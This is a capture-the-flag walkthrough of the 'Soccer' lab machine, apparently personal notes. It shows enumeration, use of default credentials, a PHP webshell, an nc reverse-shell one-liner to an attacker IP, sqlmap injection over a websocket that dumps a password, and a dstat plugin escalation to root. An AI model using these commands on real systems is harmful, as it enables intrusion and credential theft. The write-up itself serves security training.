## Soccer

### Lab Details 

- Difficulty: Easy
- Type: Web App, Tiny File Manager, Port Fowarding, SQLMAP, Linux

#### Tasks
Q1: What version of nginx is running on Soccer?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Soccer 10.10.11.194`
```
<snip>
80/tcp    open     http            syn-ack     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
<snip>
```
Q2: What directory is hosting a file manager but not linked to anywhere on the site?
- run ffuf to enumerate the target site 
```
$ ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 317ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 317ms]
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 313ms]
:: Progress: [20469/20469] :: Job [1/1] :: 127 req/sec :: Duration: [0:02:52] :: Errors: 0 ::
```

Q3: Find creds for the application and log in. What version of Tiny File Manager is running on Soccer?
- search for default login online for tiny file manager
- username, password : admin, admin@123

Q4: What is the name of the directory on the file manager do you have write access to?
- once logged in visit /upload and we can see there is a directory called /uploads which has permission 757, meaning anyone has write permission to this directory 

Q5: There is another virtual host configured nginx. What is the hostname?
- tried to enumerate for the vhost using ffuf however no luck
- `$ ffuf -w ./subdomains-top1million-20000.txt:FUZZ -u http://soccer.htb:80/ -H 'Host: FUZZ.soccer.htb'` 
- then tried to search for exploit and found https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/tree/main
- tried to use both bash and python POC unable to gain a reverse shell 
- tried modified the upload directory to match with `/var/www/html/tiny/uploads' did not work
- able to gain access to a webshell by uploading a webshell directly in the /upload folder and calling it `http://soccer.htb/tiny/uploads/webshell.php?cmd=whoami`
- get a revershell by sending a payload on webshell ` http://soccer.htb/tiny/uploads/webshell.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.14.28+4444+%3E%2Ftmp%2Ff`
- once gainted the initial foodhold we can check the nginx config file 
```
$: cat /etc/nginx/nginx.conf
<snip>
        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
<snip>
$ ls -l /etc/nginx/sites-enabled/
total 0
lrwxrwxrwx 1 root root 34 Nov 17  2022 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root 41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
$ ls -l /etc/nginx/sites-available/
total 8
-rw-r--r-- 1 root root 442 Dec  1  2022 default
-rw-r--r-- 1 root root 332 Nov 17  2022 soc-player.htb
$ cat /etc/nginx/sites-available/soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}

```
Q6: On loading the /check page on the new site, what is the full URL of the connection made to port 9091?
- according to the nginx config, the soc-player.soccer.htb is served at port 3000 on localhost that means we cant access it directly from external network
- we can confirm it with `netstat`
```
$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1089/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1089/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
- need to perform a port forwarding from target so we can access the internal port from localhost 
```
#on target
$ ./chisel client 10.10.14.28:9999 R:3000:127.0.0.1:3000 R:9091:127.0.0.1:9091 R:3306:127.0.0.1:3306 R:33060:127.0.0.1:33060
2025/06/03 16:11:46 client: Connecting to ws://10.10.14.28:9999
2025/06/03 16:11:49 client: Connected (Latency 340.039183ms)

#on attacker
$ ./chisel server -p 9999 --reverse
2025/06/03 12:08:44 server: Reverse tunnelling enabled
2025/06/03 12:08:44 server: Fingerprint D0ssBSBeVfY7TgkjtW9pXJYbJnjAflU8qUPh+qIxPpE=
2025/06/03 12:08:44 server: Listening on http://0.0.0.0:9999
2025/06/03 12:12:26 server: session#1: tun: proxy#R:3000=>3000: Listening
2025/06/03 12:12:26 server: session#1: tun: proxy#R:9091=>9091: Listening
2025/06/03 12:12:26 server: session#1: tun: proxy#R:3306=>3306: Listening
2025/06/03 12:12:26 server: session#1: tun: proxy#R:33060=>33060: Listening
```
 


Q7: What is the one non-default database found on the target?
 - we can use nmap to enumerate the database serving on the websocket
```
─$ sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' -b --fingerprint --batch --level 5 --risk 3
        ___
       __H__                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                                    
|_ -| . ["]     | .'| . |                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:58:27 /2025-06-03/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[12:58:27] [INFO] resuming back-end DBMS 'mysql' 
[12:58:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-2160 OR 3784=3784"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "1234 AND (SELECT 1602 FROM (SELECT(SLEEP(5)))atwD)"}
---
[12:58:31] [INFO] testing MySQL
[12:58:33] [INFO] confirming MySQL
[12:58:33] [INFO] the back-end DBMS is MySQL
[12:58:33] [INFO] fetching banner
[12:58:33] [INFO] resumed: 8.0.31-0ubuntu0.20.04.2
[12:58:33] [INFO] executing MySQL comment injection fingerprint
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.31
               banner parsing fingerprint: MySQL 8.0.31
banner: '8.0.31-0ubuntu0.20.04.2'
[12:58:33] [INFO] fetching database names
[12:58:33] [INFO] fetching number of databases
[12:58:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:58:33] [INFO] retrieved: 5
[12:58:42] [INFO] retrieved: mysql
[12:59:27] [INFO] retrieved: information_schema
[13:02:04] [INFO] retrieved: performance_schema
[13:04:41] [INFO] retrieved: sys
[13:05:10] [INFO] retrieved: soccer_db
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```
- the non-default database in mysql is `soccer_db`

Q8: submit the flag located in the player user's home directory 
 - we can try dump the data inside soccer_db database 
```
$ sqlmap -u ws://soc-player.soccer.htb:9091  --dump soccer_db  --data '{"id": "1234"}' -b --fingerprint --batch --level 5 --risk 3 
        ___
       __H__                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.9.2#stable}                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:19:13 /2025-06-03/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[13:19:13] [INFO] resuming back-end DBMS 'mysql' 
[13:19:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-2160 OR 3784=3784"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "1234 AND (SELECT 1602 FROM (SELECT(SLEEP(5)))atwD)"}
---
[13:19:17] [INFO] testing MySQL
[13:19:18] [INFO] confirming MySQL
[13:19:18] [INFO] the back-end DBMS is MySQL
[13:19:18] [INFO] fetching banner
[13:19:18] [INFO] resumed: 8.0.31-0ubuntu0.20.04.2
[13:19:18] [INFO] executing MySQL comment injection fingerprint
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.31
               banner parsing fingerprint: MySQL 8.0.31
banner: '8.0.31-0ubuntu0.20.04.2'
[13:19:18] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:19:18] [INFO] fetching current database
[13:19:18] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:19:18] [INFO] retrieved: soccer_db
[13:20:41] [INFO] fetching tables for database: 'soccer_db'
[13:20:41] [INFO] fetching number of tables for database 'soccer_db'
[13:20:41] [INFO] resumed: 1
[13:20:41] [INFO] resumed: accounts
[13:20:41] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[13:20:41] [INFO] retrieved: 4
[13:20:50] [INFO] retrieved: id
[13:21:11] [INFO] retrieved: email
[13:21:58] [INFO] retrieved: username
[13:23:07] [INFO] retrieved: password
[13:24:20] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[13:24:20] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[13:24:20] [INFO] retrieved: 1
[13:24:28] [INFO] retrieved: player@player.htb
[13:26:56] [INFO] retrieved: 1324
[13:27:44] [INFO] retrieved: PlayerOftheMatch2022
[13:30:43] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```
- we get user player and their password 
- attempt to login to ssh as we get the info from our initial port scan
- we can login to target with player credential
```
$ ssh player@10.10.11.194      
The authenticity of host '10.10.11.194 (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.194' (ED25519) to the list of known hosts.
player@10.10.11.194's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun  3 17:37:55 UTC 2025

  System load:           0.0
  Usage of /:            70.8% of 3.84GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             251
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:fe95:27e0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt
b4194e6e1e25e1dc4e67762d80a69b88
```
Q9: Which binary that is similar to sudo is found on the target machine and has the SetUID bit set?
- load linpeas.sh to target and run 
- under SUDI section we can see that doas is listed which is similar to sudo
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                  
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas  
<snip>
```
Q10: What command can the player user run as root with doas without a password?
- tried to find the config file for doas
```
player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
Q11: Which directory can be used to host plugins for dstat command when run as root and is writable by the player user?
- according to gtfobins, dstat is able to perform privilege escalationwith sudo accss 
- writting the plugin into `/usr/local/share/dstat/`
```
$:  echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
$: sudo dstat --xxx
```

Q12: Submit the flag located in root's home directory.
- to get a root shell just need to run the plugin 
- plugin is the suffix of the file e.g. xxx is the plugin name where dstat_xxx.py is the filename
```
player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
player@soccer:~$ ls /usr/local/share/dstat
dstat_xxx.py
player@soccer:~$ doas -n /usr/bin/dstat --xxx 
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of 's documentation for alternative uses
  import imp
# whoami
root
# cat /root/root.txt
a45f06d4b1e6edf25cb11a66066a07ef
```



#### Resources
- sqlmap usage - https://github.com/sqlmapproject/sqlmap/wiki/usage
- nstat - https://gtfobins.github.io/gtfobins/dstat/

#### Lesson Learned
